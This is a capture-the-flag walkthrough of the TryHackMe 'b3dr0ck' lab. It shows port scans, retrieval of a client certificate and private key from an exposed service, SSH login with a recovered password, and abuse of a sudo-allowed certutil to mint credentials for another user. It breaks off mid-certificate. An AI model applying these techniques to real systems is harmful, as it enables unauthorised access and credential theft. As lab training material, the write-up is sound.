# b3dr0ck

URL: https://tryhackme.com/room/b3dr0ck

Level: Easy

Date: 3 Aug 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [HTTP](#http)
	- [Obscure service on port 9009](#obscure-service-on-port-9009)
	- [TLS Socket](#tls-socket)
	
- [User flag](#user-flag)
- [Lateral movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)





## Reconnaissance

### nmap

```bash
$ sudo nmap -T4 -n -p- 10.10.188.66 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 10:51 CEST
Nmap scan report for 10.10.188.66
Host is up (0.057s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4040/tcp  open  yo-main
9009/tcp  open  pichat
54321/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 131.78 seconds
```

```bash
$ sudo nmap -T4 -n -p80,4040,9009,54321 10.10.188.66 -sC -sV -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 10:55 CEST
Nmap scan report for 10.10.188.66
Host is up (0.054s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.188.66:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2023-08-03T08:50:51
|_Not valid after:  2024-08-02T08:50:51
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Thu, 03 Aug 2023 08:55:46 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
9009/tcp  open  pichat?
| fingerprint-strings:
|   NULL:
|     ____ _____
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | |
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| |
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| fingerprint-strings:
|   JavaRMI, NULL, TerminalServer:
|_    Error: 'undefined' is not authorized for access.
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2023-08-03T08:50:51
|_Not valid after:  2024-08-02T08:50:51
|_ssl-date: TLS randomness does not represent time
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.93%T=SSL%I=7%D=8/3%Time=64CB6B92%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html
SF:\r\nDate:\x20Thu,\x2003\x20Aug\x202023\x2008:55:46\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20\
SF:x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x2
SF:0\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;\
SF:n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\n
SF:\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20\
SF:x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x20
SF:\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website!
SF:\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bedr
SF:ock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20set
SF:up\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20imp
SF:ortant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fig
SF:ured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x2
SF:0database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20dat
SF:abase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x2
SF:0it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20ho
SF:w\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\x
SF:20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x20
SF:secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:
SF:\x20text/html\r\nDate:\x20Thu,\x2003\x20Aug\x202023\x2008:55:46\x20GMT\
SF:r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<hea
SF:d>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x
SF:20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x20
SF:35em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x2
SF:0sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20
SF:\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC
SF:!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\
SF:n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20
SF:a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\
SF:x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping
SF:\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\
SF:x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x
SF:20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\
SF:x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\
SF:x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLoo
SF:ks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\
SF:x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20
SF:was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20t
SF:ry\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.93%I=7%D=8/3%Time=64CB6B80%P=x86_64-pc-linux-gnu%r(NUL
SF:L,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\n
SF:\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x2
SF:0\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x20
SF:___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x20
SF:\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x20
SF:\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\x
SF:20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20/
SF:\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20
SF:\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\|
SF:\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|\
SF:x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x20
SF:\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\___
SF:\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
SF:\nWhat\x20are\x20you\x20looking\x20for\?\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port54321-TCP:V=7.93%T=SSL%I=7%D=8/3%Time=64CB6B86%P=x86_64-pc-linux-gn
SF:u%r(NULL,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x2
SF:0access\.\n")%r(TerminalServer,31,"Error:\x20'undefined'\x20is\x20not\x
SF:20authorized\x20for\x20access\.\n")%r(JavaRMI,31,"Error:\x20'undefined'
SF:\x20is\x20not\x20authorized\x20for\x20access\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.82 seconds
```

### http

Port 80 is redirecting to `4040` with SSL:

```bash
$ curl -v http://10.10.188.66
*   Trying 10.10.188.66:80...
* Connected to 10.10.188.66 (10.10.188.66) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.188.66
> User-Agent: curl/7.87.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.18.0 (Ubuntu)
< Date: Thu, 03 Aug 2023 09:11:41 GMT
< Content-Type: text/html
< Content-Length: 178
< Connection: keep-alive
< Location: https://10.10.188.66:4040/
<
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host 10.10.188.66 left intact

```

![](Pasted%20image%2020230803111251.png)

Nothing here with `feroxbuster`

```bash
joshua@kaligra:~/Documents/thm/b3dr0ck$ feroxbuster --silent -k -u https://10.10.188.66:4040 -n -t 200 -L 1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox.txt
https://10.10.188.66:4040/
```
### obscure service on port 9009

```bash
joshua@kaligra:~/Documents/thm/b3dr0ck$ telnet  10.10.188.66 9009
Trying 10.10.188.66...
Connected to 10.10.188.66.
Escape character is '^]'.


 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|




What are you looking for? barney.txt
Sorry, unrecognized request: 'barney.txt'

You use this service to recover your client certificate and private key
What are you looking for? certificate
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMzA4MDMwODUxMzNaFw0yNDA4MDIwODUxMzNaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqq2Fv
+CRUP1KZd7tD64jTNQG+xws+KcMyR4+O0zLD9yp1ZS/Wudvc8lB7TeG+yUNDsQfN
OZ1US9CrOB1vzXm/l21kaDQnVkdCvxYOwa/uS0Rxeelvbn7z7hwS9MgZf+QuAzOA
kYfVBJAJ6UilUC5L9afFYWj84EO4CRLvZsDycqCSb4dOiHZyNRKC6MRlKFDHsMNV
sQzWSpW2u7oNBOOHwQfMjwybZweGr51f2PSIMvTa9Wx/TBr2RaOoiUPGuMLEl2D7
kRHMEttm2hM4Lm2y2M479c1gejJNwa1vWgS/a1IUbMyqKiIN7FwmnWOfQDTCI6D7
bW+nm3t9hZmLJNsVAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAMLbwVLPSOfKZ2Cr
j8KZqefOpYs6JBHyE5Xd/44OXrZFeMzTMRrP5/fYmjHBAcYqiOV4VB0wp67CaUZV
Vw+7Y5IOU4dPgl5N2MayuAvM+dM7/4xskhr8J7ya/GNoGhh77h+zApqxNPoqEzfo
tktVOD+c8Ie2YsR+B/Boa0HUglWIK56PX9Q0TfqdOoCsnrpRsjhy8XdQskg+oXb9
8mzN5UxK+BD93xnCZFSAiqDoHYDoBzmdWnrK631tIz5SOJf4NzQXxJR7uVBZ5bqM
XBGWMYwUyn259nVlaBNWOxWrx+U0hlz+dHltDwWNIJ6GMibqRTMm63SteSeJaAjq
UvBh0hA=
-----END CERTIFICATE-----


What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6qthb/gkVD9SmXe7Q+uI0zUBvscLPinDMkePjtMyw/cqdWUv
1rnb3PJQe03hvslDQ7EHzTmdVEvQqzgdb815v5dtZGg0J1ZHQr8WDsGv7ktEcXnp
b25+8+4cEvTIGX/kLgMzgJGH1QSQCelIpVAuS/WnxWFo/OBDuAkS72bA8nKgkm+H
Toh2cjUSgujEZShQx7DDVbEM1kqVtru6DQTjh8EHzI8Mm2cHhq+dX9j0iDL02vVs
f0wa9kWjqIlDxrjCxJdg+5ERzBLbZtoTOC5tstjOO/XNYHoyTcGtb1oEv2tSFGzM
qioiDexcJp1jn0A0wiOg+21vp5t7fYWZiyTbFQIDAQABAoIBAHjOZUjJC5q7RoBu
3N6oQDXKke1udmE4Cp61rDewje/IK/lnb+swnvjtXXU8sLwQzCnq1sNVp6KfrPqX
1r+ZndV91PjdlAu0JNc9m9NY7oLUCJYKVpvg3EYjDBzOGrzV09fEGh1TzgNhZ+1S
RO2li0/bVNUNwoh7wyDYuwC3exjT4Tgtucvtnfj5jG4N5Lr+ZjOBx78P2jtkoHQ1
81gbnbDGS2oY+FNZNguqdWkMcD776hqMmhhuO7kzlZ2rbipohDEzH/L9pQOKEsXh
DzBKS0zC45XUSw0xY582IQuEjzqc/PvTTFHqNHztPIxq1+6Z5/bdvSDfFfdJ25T+
s1MJmgECgYEA/1Dejo9y5VL2UQj+GubkmX22Z3XaUGKyYZCZbOmaA5kfxI8NohtK
Nj49JwUjXpFwIOd8yZGgfXzQ7ZMycwrkWLogqa8ArbZ03ZvanjZ7n5RMY++OsJx2
Y0ZawpbcNpDhfJhUsLx7HB9LOfQLfmjZWtkO0vWZ2UM4Kk8EMo0XUUECgYEA60xZ
XisviIsSlWioyxXsLE9dkYtvKrlxLDxskyyPqY3uGJvKJncOX/GXpmOt6Yar70OQ
RoAJw7D5XyHCmEvXs+stLkLTAzVjD78KZ+ZTRt1ppRleG0CDdgieM2N1e8DYqPAM
0TV9zhtqStdDDfqUgsPu6TKrVcF2V0aeHMjuQNUCgYACEZKsDwd8Si7Ku0rrxuEl
STp4HiFVs2cEmVpU4pOn4c67FfmjTZtNUzXFoioGMyF4cse1DmQBgEhlFGM9QWJW
QbPQDCXyQl8yCHg9/e0Efvwbdy5tyea/qStFFlnUa1oYW1ecUvqgYLSIVKzfKlRQ
gx+2n9zOQNgsp5U+H5yHwQKBgQCYpjaQLiovRjIvNe/TmQxYDsEgTDo5mIcAcM7r
iAxHrqlZ07AI1lJAEkcVDjPkfZcLqWRvKF+tUiHmAsvw67sroRX1niqxOTBkJcdF
cppyLfB8yIFR4r+mkp63rf2o5Ipqxxk5nJ9aWFTT6uU4q2kvkJdtOI8JGnKA2nJ3
MC/JZQKBgGeTmc7zdy/tXcsQNuwdLqZPpUeKZx2Z2XNMt4qqSumD0IORPefdmE1z
MTQ8M7a4CSHf2ugsTYzJ2Wa03Q0oJPE1lqIkTq7HuBOq9m7hjVI5sqBQIpwUKNmm
KEePmKRwwg1+SH+/qS/22QYI+uSUsXWO4hOzRLgho7NGCxvVEdTK
-----END RSA PRIVATE KEY-----


What are you looking for?

```

So far we get:

- certificate
```
-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMzA4MDMwODUxMzNaFw0yNDA4MDIwODUxMzNaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqq2Fv
+CRUP1KZd7tD64jTNQG+xws+KcMyR4+O0zLD9yp1ZS/Wudvc8lB7TeG+yUNDsQfN
OZ1US9CrOB1vzXm/l21kaDQnVkdCvxYOwa/uS0Rxeelvbn7z7hwS9MgZf+QuAzOA
kYfVBJAJ6UilUC5L9afFYWj84EO4CRLvZsDycqCSb4dOiHZyNRKC6MRlKFDHsMNV
sQzWSpW2u7oNBOOHwQfMjwybZweGr51f2PSIMvTa9Wx/TBr2RaOoiUPGuMLEl2D7
kRHMEttm2hM4Lm2y2M479c1gejJNwa1vWgS/a1IUbMyqKiIN7FwmnWOfQDTCI6D7
bW+nm3t9hZmLJNsVAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAMLbwVLPSOfKZ2Cr
j8KZqefOpYs6JBHyE5Xd/44OXrZFeMzTMRrP5/fYmjHBAcYqiOV4VB0wp67CaUZV
Vw+7Y5IOU4dPgl5N2MayuAvM+dM7/4xskhr8J7ya/GNoGhh77h+zApqxNPoqEzfo
tktVOD+c8Ie2YsR+B/Boa0HUglWIK56PX9Q0TfqdOoCsnrpRsjhy8XdQskg+oXb9
8mzN5UxK+BD93xnCZFSAiqDoHYDoBzmdWnrK631tIz5SOJf4NzQXxJR7uVBZ5bqM
XBGWMYwUyn259nVlaBNWOxWrx+U0hlz+dHltDwWNIJ6GMibqRTMm63SteSeJaAjq
UvBh0hA=
-----END CERTIFICATE-----
```

- private key
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6qthb/gkVD9SmXe7Q+uI0zUBvscLPinDMkePjtMyw/cqdWUv
1rnb3PJQe03hvslDQ7EHzTmdVEvQqzgdb815v5dtZGg0J1ZHQr8WDsGv7ktEcXnp
b25+8+4cEvTIGX/kLgMzgJGH1QSQCelIpVAuS/WnxWFo/OBDuAkS72bA8nKgkm+H
Toh2cjUSgujEZShQx7DDVbEM1kqVtru6DQTjh8EHzI8Mm2cHhq+dX9j0iDL02vVs
f0wa9kWjqIlDxrjCxJdg+5ERzBLbZtoTOC5tstjOO/XNYHoyTcGtb1oEv2tSFGzM
qioiDexcJp1jn0A0wiOg+21vp5t7fYWZiyTbFQIDAQABAoIBAHjOZUjJC5q7RoBu
3N6oQDXKke1udmE4Cp61rDewje/IK/lnb+swnvjtXXU8sLwQzCnq1sNVp6KfrPqX
1r+ZndV91PjdlAu0JNc9m9NY7oLUCJYKVpvg3EYjDBzOGrzV09fEGh1TzgNhZ+1S
RO2li0/bVNUNwoh7wyDYuwC3exjT4Tgtucvtnfj5jG4N5Lr+ZjOBx78P2jtkoHQ1
81gbnbDGS2oY+FNZNguqdWkMcD776hqMmhhuO7kzlZ2rbipohDEzH/L9pQOKEsXh
DzBKS0zC45XUSw0xY582IQuEjzqc/PvTTFHqNHztPIxq1+6Z5/bdvSDfFfdJ25T+
s1MJmgECgYEA/1Dejo9y5VL2UQj+GubkmX22Z3XaUGKyYZCZbOmaA5kfxI8NohtK
Nj49JwUjXpFwIOd8yZGgfXzQ7ZMycwrkWLogqa8ArbZ03ZvanjZ7n5RMY++OsJx2
Y0ZawpbcNpDhfJhUsLx7HB9LOfQLfmjZWtkO0vWZ2UM4Kk8EMo0XUUECgYEA60xZ
XisviIsSlWioyxXsLE9dkYtvKrlxLDxskyyPqY3uGJvKJncOX/GXpmOt6Yar70OQ
RoAJw7D5XyHCmEvXs+stLkLTAzVjD78KZ+ZTRt1ppRleG0CDdgieM2N1e8DYqPAM
0TV9zhtqStdDDfqUgsPu6TKrVcF2V0aeHMjuQNUCgYACEZKsDwd8Si7Ku0rrxuEl
STp4HiFVs2cEmVpU4pOn4c67FfmjTZtNUzXFoioGMyF4cse1DmQBgEhlFGM9QWJW
QbPQDCXyQl8yCHg9/e0Efvwbdy5tyea/qStFFlnUa1oYW1ecUvqgYLSIVKzfKlRQ
gx+2n9zOQNgsp5U+H5yHwQKBgQCYpjaQLiovRjIvNe/TmQxYDsEgTDo5mIcAcM7r
iAxHrqlZ07AI1lJAEkcVDjPkfZcLqWRvKF+tUiHmAsvw67sroRX1niqxOTBkJcdF
cppyLfB8yIFR4r+mkp63rf2o5Ipqxxk5nJ9aWFTT6uU4q2kvkJdtOI8JGnKA2nJ3
MC/JZQKBgGeTmc7zdy/tXcsQNuwdLqZPpUeKZx2Z2XNMt4qqSumD0IORPefdmE1z
MTQ8M7a4CSHf2ugsTYzJ2Wa03Q0oJPE1lqIkTq7HuBOq9m7hjVI5sqBQIpwUKNmm
KEePmKRwwg1+SH+/qS/22QYI+uSUsXWO4hOzRLgho7NGCxvVEdTK
-----END RSA PRIVATE KEY-----
```

### TLS socket

```bash
$ openssl s_client -connect 10.10.188.66:54321 -cert ./certificate -key ./key
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = localhost
...
...
...

    Start Time: 1691054701
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
Welcome: 'Barney Rubble' is authorized.
b3dr0ck>

```

```bash
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> login
Login is disabled. Please use SSH instead.

```

Let's try SSH access with user `barney` and that password...


## user flag

```bash
$ ssh barney@10.10.188.66
The authenticity of host '10.10.188.66 (10.10.188.66)' can't be established.
ED25519 key fingerprint is SHA256:CFTFQcdE19Y7z0z2H7f+gsTTUaLOiPE1gtFt0egy/V8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.188.66' (ED25519) to the list of known hosts.
barney@10.10.188.66's password:
barney@b3dr0ck:~$ ls
barney.txt
barney@b3dr0ck:~$ cat barney.txt
THM{f05780f08f0eb1de65023069dXXXXX}
barney@b3dr0ck:~$
```


## Lateral movement

```bash
barney@b3dr0ck:~$ cd /home/fred/
barney@b3dr0ck:/home/fred$ ls
fred.txt
barney@b3dr0ck:/home/fred$ cat fred.txt
cat: fred.txt: Permission denied
```

```bash
barney@b3dr0ck:~$ sudo -l
[sudo] password for barney:
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
barney@b3dr0ck:~$
```

Let's try generate keypair for `fred`

```bash
barney@b3dr0ck:~$ sudo /usr/bin/certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@b3dr0ck:~$ sudo /usr/bin/certutil fred Fred
Generating credentials for user: fred (Fred)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0XaciVI7CNJpx354tG7xgJkQemtxmvYhRbtZTn5R0aJdmZAf
aj5osLvbxU8P+KvllLsXHZkUtRD51MhKlixb6gvUHVuK96aCps09cE21SwkGiHuM
bvC5TifLkGd2vO4de6/ftSADgcMhAzkGfq0tMV4fXAt3CVKiQALb/vM4QlKF5oRd
TKiWN3MaUL1G4NJPSwHe2t5QcC+3RceXFU7hCxLGOBQQvmfX1nFVGiE+Z46WWleu
RhF8816+b130yX0GqjYuHaJQQoIkGWzlFatYNr7lZDy2USEVqu9V6kGoxBmks8nJ
gkbt6UiisauXhDLxbap6IakhAwtNxnaL/PuRiQIDAQABAoIBADYMpEHu/Rq+qNr4
cI8mnZywYockWHFDF7zVpirR/6zXd82bWe/hYMRSBVi5mQZy3M/vIvzZNnWuhrj4
Yf60PZd8K+TTbV2QEuCVz0e+VYyiLJRlRQyPg1F+hVGi0QnZa7Qx4sjrFNyUDF23
hkyDxUia3/6xWqsGLqXT1w7HlfnOt8dgBwRL/gqcbuyi8LJ8nLV4odrcxxJX+wDT
6890vx2kkHfvcZ2F1DuGD0ifZ96zwdSV7/377L48mhfNU5dAjL8sgJ9oUjB546ra
7rMq3JhiQi/tFIz6NQzQIO35E/f2bSEgLcigHMdJiWlLxGt63cqm3QJQXZdQgTch
j1vXFS0CgYEA93REAyMXNaVn7LUkPExp6x5Mrmr/WB3jk6GGrtG+ErybRySZ3Ou9
zUTztT2Qxfh/NK4rOrlXJYL13f5Zr6H2kSm3xSd2rLDnHZS6d93bsZXDVaYoeUaa
qRuRMC4JvecUOc6t6L2hflM4IMvKJsOVoL1Rydmgak0rs0oOgeFz/58CgYEA2LJ4
U62pn5Dmr/IRjO1em/EqIDtVECl/4DwTDz0fn/5FJT06wBujXn0MxeSq/CIqD9iX
nsUmFVgEWttiteye7/Ff6OzUxIMlw4VmPlGZEQu5M+HBZUrZtp19J3G9LcXmO1Kg
0muTS1rPLREU/WlidEknyFkmR6HQZZV6fEH5PdcCgYEA6DBKGP92Kbo4l50okQPK
ZvmZThfL3Ky++6mWrLbVuNMMiGbJkMgK4m8OlkNccsZG5fF/UqzSHrqRZWniUbCR
oYgZjX8IFeYwFkuV5B9io3E5RkaQt6sOOBtL0n+AWJZZHhzWhgpZXCVOB0fxOQpQ
ffDmq5XutZAPrz2P+0LHC1UCgYBcXQXItPbd2odZa1ZruSlgUpTgFCoXr3if/Tsq
faUjLuAOFWEbTSx/M9Hj76mpum4vPuSxedrXsiJ5D5WtcWP1Ze65e2jdMgFAq3V/
DoytpU+Ve55RLGxL2CjmTSaTggy2MGv4BH5N2jEARo2pzed3JU9dqBIW6jPHeMUy
fXRdFQKBgQCh9zmf3Ss1lszqndowEvPE/Wy3r+N7RlqBzRapfjkxU9AqHn5OkYrK
zhKNhjBRVWieh3sHr7SvVAWz9Dt/XMMoIk1wbU1GPOIWsUqox6PngUaxM9dtajyh
UbijvGFwUbyEAtU6gLZIfQBgge2jHxvyobwikRKlTqyb5B4Pg6R8tg==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
